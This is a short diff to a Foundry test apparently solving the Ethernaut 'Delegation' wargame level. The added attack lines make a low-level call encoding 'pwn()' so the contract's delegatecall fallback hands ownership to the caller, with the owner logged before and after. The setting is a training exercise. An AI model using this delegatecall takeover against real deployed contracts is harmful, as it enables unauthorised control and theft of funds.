@@ -27,7 +27,10 @@ contract DelegationTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        console.log(ethernautDelegation.owner());
+        (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
+        require(success, "call failed");
+        console.log(ethernautDelegation.owner());
         /*****************
          *Level Submission*
          ***************  */
